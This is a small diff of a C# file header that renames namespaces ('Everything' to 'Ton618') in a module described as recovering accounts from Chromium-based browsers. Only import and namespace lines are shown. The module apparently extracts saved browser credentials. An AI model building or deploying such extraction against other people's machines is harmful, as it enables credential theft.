@@ -1,10 +1,11 @@
-﻿using Everything.Recovery.Utilities;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
 using Q3C273.Shared.Models;
+using Ton618.Recovery;
+using Ton618.Recovery.Utilities;
 
-namespace Everything.Recovery.Browsers
+namespace Ton618.Recovery.Browsers
 {
     /// <summary>
     /// Provides basic account recovery capabilities from chromium-based applications.
